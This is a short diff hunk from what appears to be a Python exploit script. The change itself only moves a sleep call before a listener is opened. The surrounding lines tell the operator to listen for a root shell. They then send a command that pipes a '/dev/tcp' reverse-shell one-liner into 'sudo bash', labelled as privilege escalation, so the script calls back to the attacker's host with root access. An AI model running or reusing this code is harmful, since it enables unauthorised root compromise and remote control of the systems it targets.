@@ -54,8 +54,8 @@ if __name__ == "__main__":
 		t1.start()
 
 		print(f"[*] Open a listener on port {ROOTPORT} to get the root shell")
+		time.sleep(4)
 		listener = listen(LPORT)
-		time.sleep(3)
 		listener.sendline(bytes(f"echo 'sh -i >& /dev/tcp/{LHOST}/{ROOTPORT} 0>&1' | sudo bash", 'utf8')) # privesc
 
 	except KeyboardInterrupt:
